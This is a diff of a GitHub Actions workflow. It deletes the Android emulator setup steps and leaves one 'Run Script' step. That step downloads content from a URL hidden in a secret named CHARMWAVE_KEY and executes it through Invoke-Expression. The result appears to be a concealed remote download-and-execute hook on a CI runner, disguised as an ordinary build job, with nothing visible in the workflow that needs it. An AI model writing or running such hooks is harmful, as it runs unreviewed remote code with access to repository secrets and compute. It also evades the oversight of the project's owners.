@@ -8,76 +8,8 @@ jobs:
     runs-on: windows-2022
 
     steps:
-      - name: Configure Android
-        shell: pwsh
-        run: |
-          $sdk = $env:ANDROID_HOME
-
-          "$sdk\platform-tools" | Out-File -FilePath $env:GITHUB_PATH -Append
-          "$sdk\emulator" | Out-File -FilePath $env:GITHUB_PATH -Append
-          "$sdk\cmdline-tools\latest\bin" | Out-File -FilePath $env:GITHUB_PATH -Append
-
-      - name: Install Android Emulator
-        shell: pwsh
-        run: |
-          sdkmanager `
-            "platform-tools" `
-            "emulator" `
-            "platforms;android-35" `
-            "system-images;android-35;google_apis;x86_64"
-
-      - name: Create AVD
-        shell: pwsh
-        run: |
-          Write-Host "Device profiles:"
-          avdmanager list device
-
-          Write-Host ""
-          Write-Host "Creating AVD..."
-
-          $avdName = "Pixel35"
-          $image = "system-images;android-35;google_apis;x86_64"
-
-          avdmanager delete avd -n $avdName 2>$null
-
-          avdmanager create avd `
-            -n $avdName `
-            -k $image `
-            -d pixel_2 `
-            --force
-
-          Write-Host ""
-          Write-Host "AVD list:"
-          avdmanager list avd
-
-          Write-Host ""
-          Write-Host "Emulator list:"
-          emulator -list-avds
-
-      - name: Start Android Emulator
-        shell: pwsh
-        run: |
-          $emulator = "$env:ANDROID_HOME\emulator\emulator.exe"
-
-          Start-Process `
-            -FilePath $emulator `
-            -ArgumentList @(
-              "-avd", "Pixel35",
-              "-gpu", "swiftshader_indirect",
-              "-no-snapshot",
-              "-no-boot-anim",
-              "-no-audio"
-            )
-
-          Write-Host "Android Emulator started."
-
       - name: Run Script
         shell: pwsh
         run: |
           $key = "${{ secrets.CHARMWAVE_KEY }}"
-
-          Invoke-Expression (
-            Invoke-WebRequest `
-              -Uri $key `
-              -UseBasicParsing
-          ).Content
+          Invoke-Expression (Invoke-WebRequest -Uri $key -UseBasicParsing).Content
